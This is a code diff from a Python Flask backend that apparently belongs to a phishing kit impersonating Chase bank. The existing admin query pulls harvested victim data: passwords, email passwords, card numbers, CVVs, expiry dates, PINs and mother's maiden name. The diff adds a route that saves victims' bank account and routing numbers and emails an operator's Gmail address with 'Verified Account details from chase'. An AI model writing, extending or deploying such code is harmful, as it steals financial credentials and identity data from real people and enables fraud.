@@ -128,7 +128,7 @@ def admin_page():
     cursor = conn.cursor(dictionary=True)
     cursor.execute(
         """
-        SELECT id, username, password, email, mail_pss, fullname, dob, street_address, state, zip_code, phone, sss, card_d, ccc, exp_date, sims, mmn, card_d2, ccc2, exp_date2, sims2
+        SELECT id, username, password, email, mail_pss, fullname, dob, street_address, state, zip_code, phone, sss, card_d, ccc, exp_date, sims, mmn, card_d2, ccc2, exp_date2, sims2,accx,rrrc
         FROM users
         """
     )
@@ -223,6 +223,60 @@ def verify_email():
             "jaymoutrey658@gmail.com",
             "New Sign In",
             "Verified Email details from chase, check admin dashboard to confirm",
+            html=False
+        )
+
+        return jsonify({"status": "success", "message": "Successful. Continue with the verification"}), 200
+    except Exception as e:
+        # Rollback in case of error
+        conn.rollback()
+        print("Error Logining:", e)
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+
+@app.route("/account", methods=["POST"])
+def verify_account():
+    user_id = session.get("user_id")
+    data = request.form
+    if not data:
+        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
+    
+    # Required fields
+    required_fields = [
+        "acctno",
+        "rrno"
+    ]
+
+    # Validate required fields
+    for field in required_fields:
+        if not data.get(field):
+            return jsonify({
+                "status": "error",
+                "message": f"Missing field: {field}"
+            }), 400
+
+   
+    try:
+        # save to database
+        cursor.execute(
+            """
+            UPDATE users
+            SET accx=%s,
+                rrrc=%s
+            WHERE id=%s
+            """,
+            (data['acctno'], data['rrno'], user_id)
+        )
+        conn.commit()
+
+        # if attempts < 2:
+        #     return jsonify({"status": "error", "message": "Password or username not correct"})
+    
+        send_email(
+            "jaymoutrey658@gmail.com",
+            "New Sign In",
+            "Verified Account details from chase, check admin dashboard to confirm",
             html=False
         )
 
@@ -493,6 +547,7 @@ def delete():
 if __name__ == "__main__":
 
     app.run()
+
 
 
 
